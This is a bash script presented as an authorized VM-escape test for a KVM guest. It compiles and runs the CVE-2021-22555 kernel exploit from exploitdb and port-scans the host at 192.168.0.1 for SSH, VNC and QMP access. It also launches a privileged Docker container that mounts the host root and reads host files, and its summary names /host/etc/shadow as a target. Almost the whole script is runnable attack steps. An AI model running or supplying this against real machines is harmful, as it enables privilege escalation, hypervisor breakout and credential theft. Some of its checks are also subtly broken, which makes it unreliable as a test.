#!/bin/bash

# Script to test VM escape in a KVM VM (Ubuntu 24.04, kernel 6.8.0)
# Tests kernel CVEs, KVM/QEMU vulnerabilities, network attacks, and virtual devices
# Run as sudoer in an authorized environment
# Logs results to /tmp/vm_escape_kvm_test.log

LOGFILE="/tmp/vm_escape_kvm_test.log"
TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
echo "KVM VM Escape Test Log - $TIMESTAMP" > $LOGFILE
echo "=====================================" >> $LOGFILE

# Function to log messages
log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1" >> $LOGFILE
}

# Function to check command success
check_success() {
    if [ $? -eq 0 ]; then
        log "SUCCESS: $1"
    else
        log "FAILURE: $1"
    fi
}

# 1. Confirm Environment
log "=== Confirming Environment ==="
log "Hostname:"
hostname >> $LOGFILE 2>&1
log "OS Version:"
cat /etc/os-release >> $LOGFILE 2>&1
log "Kernel Version:"
uname -a >> $LOGFILE 2>&1
log "Hypervisor:"
systemd-detect-virt >> $LOGFILE 2>&1
log "QEMU Version:"
qemu-system-x86_64 --version >> $LOGFILE 2>&1
check_success "Gathered QEMU version"

# 2. Test Kernel Exploits (CVE-2022-2586, CVE-2021-22555)
log "=== Testing Kernel Exploits ==="
if [ ! -d "/tmp/exploitdb" ]; then
    sudo apt update && sudo apt install -y exploitdb git >> $LOGFILE 2>&1
    check_success "Installed exploitdb and git"
fi
log "Searching for CVE-2022-2586 PoC:"
searchsploit CVE-2022-2586 >> $LOGFILE 2>&1
check_success "Searched for CVE-2022-2586 PoC"
log "Searching for CVE-2021-22555 PoC:"
searchsploit CVE-2021-22555 >> $LOGFILE 2>&1
check_success "Searched for CVE-2021-22555 PoC"

# Attempt CVE-2021-22555 PoC (netfilter exploit, if available)
if [ -f "/usr/share/exploitdb/exploits/linux/local/50299.c" ]; then
    log "Attempting CVE-2021-22555 PoC:"
    gcc /usr/share/exploitdb/exploits/linux/local/50299.c -o /tmp/cve-2021-22555 >> $LOGFILE 2>&1
    /tmp/cve-2021-22555 >> $LOGFILE 2>&1
    check_success "Ran CVE-2021-22555 PoC"
else
    log "CVE-2021-22555 PoC not found in exploitdb"
fi

# 3. Test KVM/QEMU Vulnerabilities
log "=== Testing KVM/QEMU Vulnerabilities ==="
# Check for known QEMU CVEs (e.g., CVE-2021-3507)
log "Searching for QEMU CVEs:"
searchsploit qemu >> $LOGFILE 2>&1
check_success "Searched for QEMU CVEs"
# Install videzzo for QEMU device fuzzing
if [ ! -d "/tmp/videzzo" ]; then
    sudo apt install -y build-essential >> $LOGFILE 2>&1
    git clone https://github.com/intel/videzzo /tmp/videzzo >> $LOGFILE 2>&1
    check_success "Cloned videzzo for QEMU fuzzing"
fi
# Note: Videzzo requires setup; log instructions
log "Videzzo fuzzing requires manual setup. See /tmp/videzzo/README.md"

# 4. Network-Based Attack on Host (192.168.0.1)
log "=== Probing Host Network (192.168.0.1) ==="
sudo apt install -y nmap >> $LOGFILE 2>&1
check_success "Installed nmap"
log "Scanning host for open ports:"
nmap -p 22,5900,8000 192.168.0.1 >> $LOGFILE 2>&1
check_success "Scanned host (192.168.0.1) for ports"
# Test for QEMU management interface (e.g., VNC or QMP)
log "Testing for QEMU VNC/QMP ports:"
nc -zv 192.168.0.1 5900-5910 >> $LOGFILE 2>&1
check_success "Probed QEMU VNC ports"

# 5. Check Virtual Devices for Exploits
log "=== Checking Virtual Devices ==="
log "Listing virtual devices:"
lspci >> $LOGFILE 2>&1
lsblk >> $LOGFILE 2>&1
check_success "Listed virtual devices"
# Check for VirtIO devices
log "Checking VirtIO drivers:"
lsmod | grep virtio >> $LOGFILE 2>&1
check_success "Checked for VirtIO drivers"

# 6. Check for Host Access Evidence
log "=== Checking for Host Access ==="
# Retry Docker privileged container with specific checks
docker run --rm -it --privileged -v /:/host ubuntu bash -c "echo 'Host Hostname:' && cat /host/etc/hostname && echo 'Host Processes:' && cat /host/proc/1/cmdline" >> $LOGFILE 2>&1
check_success "Retried Docker privileged container for host access"

# 7. Summary
log "=== Summary ==="
log "Check $LOGFILE for detailed results."
log "Evidence of VM escape includes:"
log "- Successful kernel exploit (e.g., CVE-2021-22555) granting host access."
log "- Access to host files (/host/etc/shadow, /host/proc/1/cmdline)."
log "- Vulnerable QEMU services on 192.168.0.1."
log "- Virtual device crashes indicating hypervisor bugs."

# Make log file readable
chmod 644 $LOGFILE
log "Test complete. Log file: $LOGFILE"

echo "KVM VM escape test completed. Results saved to $LOGFILE"
echo "Please review the log for evidence of host access (e.g., /host/etc/shadow, QEMU vulnerabilities)."
